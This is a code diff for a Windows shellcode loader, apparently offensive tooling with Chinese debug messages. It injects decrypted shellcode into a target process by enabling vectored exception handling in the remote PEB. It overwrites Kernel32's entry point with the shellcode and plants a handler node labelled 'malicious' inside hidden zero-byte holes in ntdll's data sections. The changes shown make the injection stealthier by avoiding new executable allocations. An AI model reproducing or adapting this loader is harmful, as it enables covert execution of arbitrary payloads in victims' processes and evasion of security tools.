 	SFNtQueryInformationProcess(hProcess, ProcessBasicInformation, &processInfo, sizeof(processInfo), &returnLength);
-	if (returnLength == 0) {
-		#ifdef DEBUG
-		printf("[-] NtQueryInformationProcess failed\n");
-		#endif
-		return NULL;
-	}
 	//Read the PEB from the remote process
 	PEB2 peb_copy;
 	SIZE_T bytesRead = 0;
 	SFNtReadVirtualMemory(hProcess, processInfo.PebBaseAddress, &peb_copy, sizeof(PEB2), &bytesRead);
 	if (bytesRead == 0) {
 		#ifdef DEBUG
-		printf("[-] NtReadVirtualMemory(PEB) failed\n");
+		printf("[-] 读取目标进程PEB失败\n");
 		#endif
-		return NULL;
+		exit(0);
 	}
 	//Enable VEH in our local copy and write it to the remote process
 	peb_copy.u2.CrossProcessFlags = 0x4;
@@ -632,32 +689,115 @@ LPVOID EnableRemoteVEH(HANDLE hProcess) {
 	SFNtWriteVirtualMemory(hProcess, processInfo.PebBaseAddress, &peb_copy, sizeof(PEB2), &bytesWritten);
 	if (bytesWritten == 0) {
 		#ifdef DEBUG
-		printf("[-] NtWriteVirtualMemory(PEB) failed\n");
+		printf("[-] 写入目标进程PEB失败\n");
 		#endif
-		return NULL;
+		exit(0);
 	}
 	//Reread the remote PEB to ensure that we did enable VEH
 	bytesRead = 0;
 	SFNtReadVirtualMemory(hProcess, processInfo.PebBaseAddress, &peb_copy, sizeof(PEB2), &bytesRead);
 	if (bytesRead == 0) {
 		#ifdef DEBUG
-		printf("[-] NtReadVirtualMemory(PEB, verify) failed\n");
+		printf("[-] 写入目标进程PEB验证失败\n");
 		#endif
-		return NULL;
+		exit(0);
 	}
 	if (peb_copy.u2.CrossProcessFlags & 0x4) {
 		#ifdef DEBUG
-		printf("Enabled VEH in the remote process!\n");
+		printf("[+] 成功启用目标进程VEH\n");
 		#endif
-		return peb_copy.ImageBaseAddress;
+		return;
 	}
 	else {
 		#ifdef DEBUG
-		printf("[-] Failed to enable VEH in the remote process\n");
+		printf("[-] 启用目标进程VEH失败\n");
 		#endif
 	}
-	return NULL;
+	exit(0);
 
+}
+
+// 扫描远程进程指定区域 查找满足对齐要求且长度为holeSize的连续零字节空洞
+static PVOID FindZeroHoleInRemote(
+    HANDLE hProcess,
+    PVOID regionBase,
+    SIZE_T regionSize,
+    SIZE_T holeSize,
+    SIZE_T alignment)
+{
+    ULONG_PTR start = (ULONG_PTR)regionBase;
+    ULONG_PTR end = start + regionSize;
+    ULONG_PTR current = start;
+
+    BYTE buffer[0x2000];
+    SIZE_T bufferCap = sizeof(buffer);
+
+    SIZE_T zeroRun = 0;
+    ULONG_PTR zeroRunStart = 0;
+
+    #ifdef DEBUG
+    printf("[+] 寻找内存空洞: 基址=%p 区域长度=0x%zx 需求长度=0x%zx 对齐=0x%zx\n", regionBase, regionSize, holeSize, alignment);
+    #endif
+
+    while (current < end) {
+        // 查询当前页的保护，跳过非可写页（避免命中只读 Image 页）
+        MEMORY_BASIC_INFORMATION mbi;
+        SIZE_T qsz = 0;
+        NTSTATUS qst = SFNtQueryVirtualMemory(hProcess, (PVOID)current, MemoryBasicInformation, &mbi, sizeof(mbi), &qsz);
+        if (qst == 0) {
+            ULONG protect = mbi.Protect & 0xFF;
+            if (!(protect == PAGE_READWRITE || protect == PAGE_EXECUTE_READWRITE || protect == PAGE_WRITECOPY || protect == PAGE_EXECUTE_WRITECOPY)) {
+                #ifdef DEBUG
+                printf("[+] 跳过非可写页: 基址=%p 长度=0x%zx 保护=0x%X\n", mbi.BaseAddress, mbi.RegionSize, mbi.Protect);
+                #endif
+                current = (ULONG_PTR)mbi.BaseAddress + mbi.RegionSize;
+                zeroRun = 0;
+                continue;
+            }
+        }
+        SIZE_T toRead = (SIZE_T)((end - current) < bufferCap ? (end - current) : bufferCap);
+        SIZE_T bytesRead = 0;
+
+        NTSTATUS st = SFNtReadVirtualMemory(hProcess, (PVOID)current, buffer, toRead, &bytesRead);
+        if (st != 0 || bytesRead == 0) {
+            #ifdef DEBUG
+            printf("[+] 读取失败/空页: 基址=%p 长度=0x%zx st=0x%08X bytesRead=0x%zx\n", (PVOID)current, toRead, st, bytesRead);
+            #endif
+            zeroRun = 0;
+            current += toRead;
+            continue;
+        }
+
+        for (SIZE_T i = 0; i < bytesRead; i++) {
+            if (buffer[i] == 0) {
+                if (zeroRun == 0) {
+                    zeroRunStart = current + i;
+                }
+                zeroRun++;
+
+                if (zeroRun >= holeSize) {
+                    ULONG_PTR aligned = (zeroRunStart + (alignment - 1)) & ~(alignment - 1);
+                    ULONG_PTR coveredEnd = current + i + 1;
+                    if (aligned + holeSize <= coveredEnd) {
+                        #ifdef DEBUG
+                        printf("[+] 找到内存空洞: 地址=%p 长度>=0x%zx (对齐=%p)\n", (PVOID)zeroRunStart, zeroRun, (PVOID)aligned);
+                        #endif
+                        return (PVOID)aligned;
+                    }
+                }
+            }
+            else {
+                zeroRun = 0;
+            }
+        }
+
+        current += bytesRead;
+    }
+
+    #ifdef DEBUG
+    printf("[+] 未找到内存空洞\n");
+    #endif
+    return NULL;
 }
 
 int main() {
@@ -676,38 +816,42 @@ int main() {
 		#ifdef DEBUG
 		printf("[-] 句柄权限提升失败\n");
 		#endif
-		while (TRUE);
+		return 0;
 	}
 
 	unsigned char* shellcode = shellcode_decrypt(encrypted_shellcode, sizeof(encrypted_shellcode));
 	SIZE_T shellcodeSize = sizeof(encrypted_shellcode);
 
-	DWORD sectionSize;
-	PVOID sectionVa;
-	GetNtdllSectionVa(".mrdata", &sectionVa, &sectionSize);
+	DWORD mrdataSize;
+	PVOID mrdataVa;
+	GetNtdllSectionVa(".mrdata", &mrdataVa, &mrdataSize);
+
+	DWORD dataSize;
+	PVOID dataVa;
+	GetNtdllSectionVa(".data", &dataVa, &dataSize);
 
 	//Get the address of the Vectored Handler List in our local process, since it should be the same in the remote process
 	PVOID LdrpVectoredHandlerList = findLdrpVectorHandlerList(VEH);
 
-	//Enable the remote VEH, this will also return the imageBaseAddress value from the PEB
-	LPVOID imageBaseAddress = EnableRemoteVEH(hProcess);
+	EnableRemoteVEH(hProcess);
 
 	// 写入Shellcode
 	ULONG oldProtect = 0;
-	LPVOID shellcodeAddress = NULL;
-	SIZE_T shellcodeRegion = shellcodeSize;
-	SFNtAllocateVirtualMemory(hProcess, &shellcodeAddress, 0, &shellcodeRegion, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	LPVOID shellcodeAddress = GetLocalKernel32EntryPoint();
 	#ifdef DEBUG
-	printf("[*] Remote shellcode address: %p\n", shellcodeAddress);
+	printf("[*] 正在将Shellcode注入到Kernel32!BaseDllInitialize(0x%p)...\n", shellcodeAddress);
 	#endif
-	SIZE_T bytesWritten = 0;
-	SFNtWriteVirtualMemory(hProcess, shellcodeAddress, shellcode, shellcodeSize, &bytesWritten);
-
 	PVOID protectBase = shellcodeAddress;
 	SIZE_T protectSize = shellcodeSize;
+	SFNtProtectVirtualMemory(hProcess, &protectBase, &protectSize, PAGE_EXECUTE_READWRITE, &oldProtect);
+	SIZE_T bytesWritten = 0;
+	SFNtWriteVirtualMemory(hProcess, shellcodeAddress, shellcode, shellcodeSize, &bytesWritten);
 	SFNtProtectVirtualMemory(hProcess, &protectBase, &protectSize, PAGE_EXECUTE_READ, &oldProtect);
 
 	//Encode the pointer to our shellcode in the context of the remote process via ntdll
+	#ifdef DEBUG
+	printf("[*] 正在编码Shellcode指针...\n");
+	#endif
 	PVOID encodedShellcodePointer = NULL;
 	PVOID ntdllBase = NULL;
 	UNICODE_STRING usNtdll;
@@ -719,7 +863,9 @@ int main() {
 	PRtlEncodeRemotePointer pRtlEncodeRemotePointer = NULL;
 	status = LdrGetProcedureAddress(ntdllBase, &asFunc, 0, (PVOID*)&pRtlEncodeRemotePointer);
 	status = pRtlEncodeRemotePointer(hProcess, shellcodeAddress, &encodedShellcodePointer);
-
+	#ifdef DEBUG
+	printf("[+] 编码Shellcode指针完成 指针: 0x%p\n", encodedShellcodePointer);
+	#endif
 	//Allocate our VEH and set the pointer to our encoded pointer
 	PVECTXCPT_CALLOUT_ENTRY maliciousHandler = HeapAlloc(GetProcessHeap(), 0, sizeof(VECTXCPT_CALLOUT_ENTRY));
 	maliciousHandler->VectoredHandler = encodedShellcodePointer;
@@ -734,43 +880,83 @@ int main() {
 	((PLIST_ENTRY)maliciousHandler)->Flink = firstEntry->Flink;
 	((PLIST_ENTRY)maliciousHandler)->Blink = firstEntry->Blink;
 
-	//Allocate a ref value in the remote process and set it to a valid value
-	PVOID refAddress = NULL;
-	SIZE_T refRegion = sizeof(ULONG);
-	SFNtAllocateVirtualMemory(hProcess, &refAddress, 0, &refRegion, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-
-	ULONG ref = 1;
-	bytesWritten = 0;
-	SFNtWriteVirtualMemory(hProcess, refAddress, &ref, sizeof(ULONG), &bytesWritten);
-
-	//Update our local VEH with the address
-	maliciousHandler->reserved = refAddress;
-
-	//Write our local VEH into the remote process
-	PVOID remoteHandlerAddress = NULL;
+	// 在ntdll .data段寻找空洞
+	#ifdef DEBUG
+	printf("[*] 正在ntdll .data段寻找空洞 写入VEH结点...\n");
+	#endif
+	PVOID scanBase = dataVa;
+	SIZE_T scanSize = dataSize;
+	const char* scanName = ".data";
 	SIZE_T calloutSize = sizeof(VECTXCPT_CALLOUT_ENTRY);
-	SFNtAllocateVirtualMemory(hProcess, &remoteHandlerAddress, 0, &calloutSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	SIZE_T holeAlignment = sizeof(void*);
+	SIZE_T totalNeeded = calloutSize + sizeof(ULONGLONG);
+	totalNeeded = (SIZE_T)ALIGN_UP(totalNeeded, holeAlignment);
+	PVOID zeroHole = FindZeroHoleInRemote(hProcess, scanBase, scanSize, totalNeeded, holeAlignment);
+	if (zeroHole == NULL) { // 若失败 在ntdll .mrdata段寻找空洞
+		#ifdef DEBUG
+		printf("[+] 在.data段寻找空洞失败 正在.mrdata段寻找空洞\n");
+		#endif
+		scanBase = mrdataVa;
+		scanSize = mrdataSize;
+		scanName = ".mrdata";
+		zeroHole = FindZeroHoleInRemote(hProcess, scanBase, scanSize, totalNeeded, holeAlignment);
+	}
+	if (zeroHole != NULL) {
+		ULONGLONG ref64 = 1;
+		PVOID refAddress = (PVOID)ALIGN_UP(((ULONG_PTR)zeroHole + calloutSize), sizeof(ULONGLONG));
+		bytesWritten = 0;
+		SFNtWriteVirtualMemory(hProcess, refAddress, &ref64, sizeof(ULONGLONG), &bytesWritten);
+		#ifdef DEBUG
+		printf("[+] 写入ref64:0x%llX 地址%p, 写入字节数0x%zx\n", ref64, refAddress, bytesWritten);
+		#endif
 
-	bytesWritten = 0;
-	SFNtWriteVirtualMemory(hProcess, remoteHandlerAddress, maliciousHandler, calloutSize, &bytesWritten);
+		// 更新本地结点的 reserved 指向 refAddress
+		maliciousHandler->reserved = refAddress;
 
-	//Change our copied LIST_HEAD for the remote process to point at our new remote handler
-	firstEntry->Blink = remoteHandlerAddress;
-	firstEntry->Flink = remoteHandlerAddress;
+		// 写入结点本体
+		bytesWritten = 0;
+		SFNtWriteVirtualMemory(hProcess, zeroHole, maliciousHandler, calloutSize, &bytesWritten);
+		#ifdef DEBUG
+		printf("[+] 写入handler节点: 地址%p 长度0x%zx, 写入字节数0x%zx\n", zeroHole, calloutSize, bytesWritten);
+		#endif
 
-	//Unprotect the .mrdata section, write the VEH list in the remote process, and reprotect .mrdata
-	PVOID mrdataBase = sectionVa;
-	SIZE_T mrdataSize = sectionSize;
-	ULONG mrdataOldProtect = 0;
-	SFNtProtectVirtualMemory(hProcess, &mrdataBase, &mrdataSize, PAGE_READWRITE, &mrdataOldProtect);
+		// 更改我们复制的 ListHead 为指向零洞中的结点（保持结点的 Flink/Blink 指向 ListHead）
+		firstEntry->Blink = zeroHole;
+		firstEntry->Flink = zeroHole;
+
+		// 将更新后的 ListHead 写回对应的节（多数情况下是 .data）
+		bytesWritten = 0;
+		SFNtWriteVirtualMemory(hProcess, LdrpVectoredHandlerList, firstEntry, sizeof(LIST_ENTRY), &bytesWritten);
+
+		// 若写入失败（只读页），短暂修改页保护为 RW -> 写入 -> 恢复
+		if (bytesWritten == 0) {
+			PVOID protBase = (PVOID)((ULONG_PTR)LdrpVectoredHandlerList & ~(ULONG_PTR)0xFFF);
+			SIZE_T protSize = (((ULONG_PTR)LdrpVectoredHandlerList + sizeof(LIST_ENTRY) + 0xFFF) & ~(ULONG_PTR)0xFFF) - (ULONG_PTR)protBase;
+			ULONG oldProtPage = 0, tmpOld = 0;
+			#ifdef DEBUG
+			printf("[!] ListHead直接写入失败 修改页保护为RW: 地址%p 长度0x%zx\n", protBase, protSize);
+			#endif
+			SFNtProtectVirtualMemory(hProcess, &protBase, &protSize, PAGE_READWRITE, &oldProtPage);
+			bytesWritten = 0;
+			SFNtWriteVirtualMemory(hProcess, LdrpVectoredHandlerList, firstEntry, sizeof(LIST_ENTRY), &bytesWritten);
+			SFNtProtectVirtualMemory(hProcess, &protBase, &protSize, oldProtPage ? oldProtPage : PAGE_READONLY, &tmpOld);
+		}
+		#ifdef DEBUG
+		printf("[+] 向目标写入VEH ListHead: 地址%p -> Flink=%p Blink=%p, 写入字节数0x%zx\n", LdrpVectoredHandlerList, firstEntry->Flink, firstEntry->Blink, bytesWritten);
+		#endif
+
+		goto INJECTION_DONE;
+	} else {
+		#ifdef DEBUG
+		printf("[-] 未找到空洞\n");
+		#endif
+		return 0;
+	}
 
 	bytesWritten = 0;
 	SFNtWriteVirtualMemory(hProcess, LdrpVectoredHandlerList, firstEntry, sizeof(LIST_ENTRY), &bytesWritten);
 
-	mrdataBase = sectionVa;
-	mrdataSize = sectionSize;
-	SFNtProtectVirtualMemory(hProcess, &mrdataBase, &mrdataSize, mrdataOldProtect, &oldProtect);
-
+INJECTION_DONE:
 	#ifdef DEBUG
 	printf("[+] 注入完成\n");
 	#endif
